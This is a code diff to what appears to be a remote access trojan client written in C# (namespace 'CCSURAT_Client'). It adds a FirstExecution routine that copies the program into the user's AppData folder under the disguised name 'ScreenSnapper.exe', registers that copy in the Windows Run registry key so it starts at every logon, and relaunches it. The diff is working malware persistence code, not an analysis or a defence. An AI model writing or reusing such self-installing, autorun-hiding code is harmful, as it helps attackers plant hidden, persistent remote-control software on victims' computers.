@@ -7,6 +7,7 @@ using System.Text;
 using System.Threading;
 using System.Diagnostics;
 using System.Net;
+using System.IO;
 
 namespace CCSURAT_Client
 {
@@ -256,6 +257,45 @@ namespace CCSURAT_Client
                 }
             }
             catch(Exception ex) { }
+        }
+
+        // Performs first execution check and installs if needed.
+        public static bool FirstExecution()
+        {
+            try
+            {
+                string folderName = "CCSU";
+                string fileName = "ScreenSnapper";
+                string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+                // Check if client is already installed in proper location.
+                if (Application.ExecutablePath != path + @"\" + folderName + "\\" + fileName + ".exe")
+                {
+                    // Check if install directory exists.
+                    if (!Directory.Exists(path + @"\" + folderName + "\\"))
+                        Directory.CreateDirectory(path + @"\" + folderName + "\\");
+                    // Check if a file with the same name exists.
+                    if (File.Exists(path + @"\" + folderName + "\\" + fileName + ".exe"))
+                        File.Delete(path + @"\" + folderName + "\\" + fileName + ".exe");
+                    File.Copy(Application.ExecutablePath, path + @"\" + folderName + "\\" + fileName + ".exe");
+
+                    RegistryKey autoRunReg = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+                    autoRunReg.SetValue(fileName, path + @"\" + folderName + "\\" + fileName + ".exe");
+
+                    Process newProc = new Process();
+                    newProc.StartInfo.FileName = path + @"\" + folderName + "\\" + fileName + ".exe";
+                    newProc.StartInfo.Arguments = Application.ExecutablePath;
+                    newProc.Start();
+                    return true;
+                }
+                else
+                {
+                    return false;
+                }
+            }
+            catch (Exception ex)
+            {
+                return true;
+            }
         }
         #endregion
 
